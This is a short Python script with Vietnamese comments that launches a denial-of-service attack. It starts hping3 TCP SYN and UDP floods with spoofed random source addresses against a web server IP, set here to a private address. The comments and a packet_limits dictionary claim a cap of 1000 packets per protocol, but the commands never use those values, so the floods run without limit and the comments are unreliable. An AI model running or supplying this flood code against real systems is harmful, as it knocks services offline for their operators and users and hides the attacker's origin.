import subprocess

def generate_ddos_traffic(web_server_ip, packet_limits):
    print(f"Starting DDOS Attack on {web_server_ip} with packet limits:")
    print(f"TCP: {packet_limits['TCP']}, UDP: {packet_limits['UDP']}")
    
    # Tạo lưu lượng TCP flood với giới hạn gói tin
    subprocess.Popen(
        f"hping3 --flood --rand-source -S -p 80 {web_server_ip}", shell=True
    )
    
    # Tạo lưu lượng UDP flood với giới hạn gói tin
    subprocess.Popen(
        f"hping3 --flood --rand-source --udp -p 80 {web_server_ip}", shell=True
    )

if __name__ == '__main__':
    web_server_ip = "192.168.2.2"  # IP của web server
    
    # Giới hạn số gói tin cho mỗi giao thức
    packet_limits = {
        "TCP": 1000,  # Giới hạn 1000 gói TCP
        "UDP": 1000,   # Giới hạn 1000 gói UDP
    }
    
    generate_ddos_traffic(web_server_ip, packet_limits)
    print("DDOS traffic is running. Use CTRL+C to stop.")
